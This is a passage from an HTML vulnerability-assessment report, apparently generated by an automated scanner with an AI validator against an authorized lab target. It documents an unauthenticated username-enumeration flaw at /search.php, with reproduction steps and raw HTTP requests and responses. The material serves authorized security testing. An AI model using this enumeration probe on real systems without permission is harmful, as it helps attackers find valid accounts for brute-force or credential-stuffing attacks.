+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: no-store, no-cache, must-revalidate
+connection: Keep-Alive
+content-length: 229
+content-type: text/html; charset=UTF-8
+date: Wed, 01 Jul 2026 05:05:52 GMT
+expires: Thu, 19 Nov 1981 08:52:00 GMT
+keep-alive: timeout=5, max=100
+pragma: no-cache
+server: Apache/2.4.54 (Debian)
+set-cookie: &lt;redacted&gt;
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+ 
+
+    &lt;html&gt;
+    &lt;head&gt;&lt;title&gt;PHPAbUsers&lt;/title&gt;&lt;/head&gt;
+    &lt;body&gt;
+        &lt;p&gt;&lt;h3&gt;Available functions&lt;/h3&gt;&lt;/p&gt;
+        &lt;a href=&quot;/search.php&quot;&gt;Search users&lt;/a&gt;&lt;br&gt;
+        &lt;a href=&quot;/login.php&quot;&gt;Login&lt;/a&gt;&lt;br&gt;
+    &lt;/body&gt;
+    &lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-7">
+<h3><span class="badge" style="background:#8a6d00">SUSPECTED</span> <span class="badge" style="background:#f57c00">MEDIUM</span> 7. [idor] Unauthenticated Account Oracle — Username Enumeration at /search.php</h3>
+<div class="kv">Screen: <code>s-0002</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:8080/</div>
+<div class="kv"><b>Anomaly (why this is a lead):</b> POST /search.php with username=admin and NO auth returns 385-byte &quot;User exists: admin&quot;; same request with username=nonexistentxyz999 returns 372-byte &quot;No results&quot;. The 13-byte body differential and literal &quot;User exists&quot; marker expose an unauthenticated account oracle. Two independent replays (ev-mr1kvrky-1f: 385 B, ev-mr1ky6bd-1h: 385 B) confirm stability. Evidence recorder rejects confirmed verdict for same-HTTP-status (200) differential findings — manual verification of the body-content difference will upgrade this.</div>
+<div class="desc">POST /search.php returns &quot;User exists: &amp;lt;name&amp;gt;&quot; for valid accounts and &quot;No results&quot; for non-existent ones, with no authentication required. Any unauthenticated visitor can enumerate valid usernames (e.g., &quot;admin&quot; confirmed), enabling targeted brute-force or credential-stuffing attacks.</div>
+<div><b>Reproduction</b></div><pre>1. POST http://target.local:8080/search.php\n   Content-Type: application/x-www-form-urlencoded, no auth\n   Body: username=admin\n   → 385-byte response: &quot;User exists: admin&quot;\n2. Same endpoint, body: username=nonexistentxyz999\n   → 372-byte response: &quot;No results&quot;</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr1kvrky-1f</code> — <code>artifacts/s-0002/ev-mr1kvrky-1f/</code></div><div class="lbl">REQUEST</div><pre>POST /search.php HTTP/1.1
+Host: target.local:8080
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/x-www-form-urlencoded
+
+username=admin</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 385
+content-type: text/html; charset=UTF-8
+date: Wed, 01 Jul 2026 04:31:13 GMT
+keep-alive: timeout=5, max=99
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+You are connected successfully!&lt;br/&gt; User exists: admin&lt;br/&gt;
+&lt;!-- The search form --&gt; 
+&lt;form action=&quot;search.php&quot; method=&quot;POST&quot;&gt;
+&lt;div class=&quot;form-group&quot;&gt;
+  &lt;label for=&quot;user&quot;&gt;Username:&lt;/label&gt;
+  &lt;input type=&quot;text&quot; class=&quot;form-control&quot; id=&quot;username&quot; name=&quot;username&quot;&gt;
+&lt;/div&gt;
+&lt;button type=&quot;submit&quot; class=&quot;btn btn-default&quot;&gt;Validate&lt;/button&gt;
+&lt;/form&gt;
+&lt;a href=&quot;/index.php&quot;&gt;Back to index&lt;/a&gt;&lt;br&gt;</pre></div>
+</div>
+</body></html>
